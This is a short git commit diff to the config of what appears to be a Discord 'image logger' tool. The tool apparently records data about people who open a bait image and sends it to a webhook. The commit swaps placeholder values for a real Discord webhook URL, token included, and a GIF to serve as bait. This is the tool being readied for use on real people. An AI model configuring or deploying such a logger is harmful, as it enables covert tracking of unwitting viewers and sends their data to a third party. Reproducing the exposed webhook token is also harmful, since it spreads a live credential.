f945b09d0bf7c71af4be14d18657cdf5cc8c9a86
m5ta <eclipsirs@gmail.com>
2025-02-18 14:33:54 +1000

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1341261661419343872/fvOCHLd5UW71DdQFdEkS-tLeqvTnFlGzFwpwscaovcf0j0GCgvDbsL3eGfnJ40OL-ysp",
+    "image": "https://media1.tenor.com/m/uy_OBkkROWIAAAAd/yummy-tongue.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
